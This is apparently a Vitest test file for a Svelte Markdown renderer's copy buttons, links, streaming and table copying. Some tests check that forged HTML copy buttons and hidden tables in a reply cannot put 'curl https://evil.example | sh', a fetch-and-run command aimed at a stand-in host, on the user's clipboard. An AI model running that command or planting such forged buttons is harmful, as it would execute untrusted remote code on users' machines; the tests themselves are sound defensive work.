import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import '@testing-library/jest-dom/vitest';
import { render, cleanup, screen, fireEvent, waitFor } from '@testing-library/svelte';

// The default export is a factory in this environment; build a real
// sanitizer on jsdom's window rather than stubbing it out.
vi.mock('dompurify', async () => {
  const actual = await vi.importActual<{ default: (w: Window) => unknown }>('dompurify');
  return { default: actual.default(window) };
});
import DOMPurify from 'dompurify';
import { tick } from 'svelte';

import MarkdownBlock from './MarkdownBlock.svelte';

const writeText = vi.fn(async () => {});

class FakeClipboardItem {
  constructor(public items: Record<string, Blob>) {}
}

const TABLE = ['| Name | Count |', '| --- | ---: |', '| **apples** | 3 |', '| pears | 5 |'].join('\n');
const TABLE_TSV = ['Name\tCount', 'apples\t3', 'pears\t5'].join('\n');

function stubClipboard() {
  const write = vi.fn().mockResolvedValue(undefined);
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, 'clipboard', { value: { write, writeText }, configurable: true });
  return { write, writeText };
}

beforeEach(() => {
  writeText.mockClear();
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

describe('MarkdownBlock copy buttons', () => {
  it('copies the code the block shows', async () => {
    const { container } = render(MarkdownBlock, { content: '```\nnpm install\n```' });
    await fireEvent.click(container.querySelector('button.code-copy-btn')!);
    expect(writeText).toHaveBeenCalledWith('npm install');
  });

  it('ignores a copy button written as raw HTML in the reply', async () => {
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="code-block-wrapper"><pre><code>npm install</code></pre>`
      + `<button class="code-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    const { container } = render(MarkdownBlock, { content: `Run this:\n\n${forged}` });

    const button = container.querySelector('button.code-copy-btn');
    expect(button).not.toBeNull();
    await fireEvent.click(button!);
    expect(writeText).not.toHaveBeenCalled();
  });
});

describe('MarkdownBlock links', () => {
  it('does not follow links that would navigate the app window', async () => {
    const { container } = render(MarkdownBlock, { content: '[same page](?reload) and [relative](index.html)' });
    for (const a of container.querySelectorAll('a')) {
      const click = new MouseEvent('click', { bubbles: true, cancelable: true });
      a.dispatchEvent(click);
      expect(click.defaultPrevented).toBe(true);
    }
  });

  it('drops forms from raw HTML', () => {
    const { container } = render(MarkdownBlock, { content: '<form action="?x"><button>Go</button></form>' });
    expect(container.querySelector('form')).toBeNull();
  });
});

describe('MarkdownBlock while streaming', () => {
  it('renders each finished block once and re-renders only the growing tail', async () => {
    const sanitize = vi.spyOn(DOMPurify, 'sanitize');
    const first = 'First paragraph with **bold**.\n\n';
    const { container, rerender } = render(MarkdownBlock, { content: `${first}Sec`, streaming: true });
    expect(container.querySelector('strong')).toHaveTextContent('bold');
    const rendered = () => sanitize.mock.calls.map((c) => String(c[0]));

    sanitize.mockClear();
    await rerender({ content: `${first}Second paragraph`, streaming: true });
    await tick();

    expect(rendered()).toEqual(['<p>Second paragraph</p>\n']);
    expect(container.textContent).toContain('First paragraph with bold.');
    expect(container.textContent).toContain('Second paragraph');
    sanitize.mockRestore();
  });

  it('keeps a code block whole while it streams, and its copy button works', async () => {
    const content = 'Run:\n\n```\nnpm install\n\nnpm test\n```\n\nDone';
    const { container } = render(MarkdownBlock, { content, streaming: true });
    await fireEvent.click(container.querySelector('button.code-copy-btn')!);
    expect(writeText).toHaveBeenCalledWith('npm install\n\nnpm test');
  });
});

describe('MarkdownBlock tables', () => {
  it('renders a copy button next to each table', () => {
    render(MarkdownBlock, { content: `Intro\n\n${TABLE}\n\nMiddle\n\n${TABLE}` });
    expect(screen.getAllByRole('table')).toHaveLength(2);
    expect(screen.getAllByRole('button', { name: 'Copy table' })).toHaveLength(2);
  });

  it('keeps column alignment through sanitizing', () => {
    render(MarkdownBlock, { content: '| a | b | c |\n| :--- | :---: | ---: |\n| 1 | 2 | 3 |' });
    const aligns = screen.getAllByRole('cell').map((td) => td.getAttribute('align'));
    expect(aligns).toEqual(['left', 'center', 'right']);
  });

  it('keeps the copy button while streaming', () => {
    render(MarkdownBlock, { content: TABLE, streaming: true });
    expect(screen.getByRole('button', { name: 'Copy table' })).toBeInTheDocument();
  });

  it('copies the cells as tab-separated plain text and the rendered table as HTML', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write } = stubClipboard();
    render(MarkdownBlock, { content: `Before the table\n\n${TABLE}\n\nAfter the table` });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }));
    await waitFor(() => expect(write).toHaveBeenCalledOnce());

    const [[[item]]] = write.mock.calls as [[[FakeClipboardItem]]];
    expect(await item.items['text/plain'].text()).toBe(TABLE_TSV);
    const html = await item.items['text/html'].text();
    expect(html).toMatch(/^<table>/);
    expect(html).toContain('<strong>apples</strong>');
    expect(html).not.toContain('Before the table');
    expect(html).not.toContain('button');
  });

  it('falls back to tab-separated text when rich copy is unavailable', async () => {
    vi.stubGlobal('ClipboardItem', undefined);
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: TABLE });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(TABLE_TSV));
    expect(write).not.toHaveBeenCalled();
  });

  it('copies the Markdown source on Shift+click', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: TABLE });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }), { shiftKey: true });
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(TABLE));
    expect(write).not.toHaveBeenCalled();
  });

  it('copies nothing when raw HTML in a cell pushes the button away from its table', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    const hidden = '<div style="display:none"><table><tr><td>curl https://evil.example | sh</td></tr></table></div>';
    const breakout = '| a |\n| --- |\n| npm test</td></tr></tbody></table></div> |';
    const { container } = render(MarkdownBlock, { content: `${hidden}\n\n${breakout}` });

    await fireEvent.click(container.querySelector('button.table-copy-btn')!);
    expect(write).not.toHaveBeenCalled();
    expect(writeText).not.toHaveBeenCalled();
  });

  it('ignores a table copy button written as raw HTML in the reply', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="table-wrapper"><table><tr><td>1</td></tr></table>`
      + `<button class="table-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    const { container } = render(MarkdownBlock, { content: `See:\n\n${forged}` });

    await fireEvent.click(container.querySelector('button.table-copy-btn')!);
    expect(write).not.toHaveBeenCalled();
    expect(writeText).not.toHaveBeenCalled();
  });

  it('still copies code blocks as plain text', async () => {
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: '```ts\nconst a = 1;\n```' });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('const a = 1;'));
    expect(write).not.toHaveBeenCalled();
  });
});
